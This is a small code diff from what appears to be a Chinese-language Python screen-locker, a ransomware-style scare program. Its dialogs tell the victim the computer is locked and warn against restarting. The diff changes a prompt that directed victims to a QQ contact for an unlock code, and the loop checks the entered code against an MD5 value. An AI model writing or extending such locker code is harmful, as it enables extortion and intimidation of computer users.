@@ -59,7 +59,7 @@ def mainProgram():
              "                                                    警告，您的电脑目前已被锁机！","警告！","继续")
   gui.buttonbox("                    您的电脑目前已经无法正常使用，请不要重启！", "警告！", ["我已知晓"])
   while True:
-      key = gui.enterbox("请前往QQ：2738549065获取解锁码!",KEY_A,"解锁码放在这里!")
+      key = gui.enterbox("解锁码!",KEY_A,"解锁码放在这里!")
       strback = str(key)
       if strback == HEXMD5:
           gui.msgbox("恭喜，您的电脑已经成功解锁","恭喜","查看温馨提示")
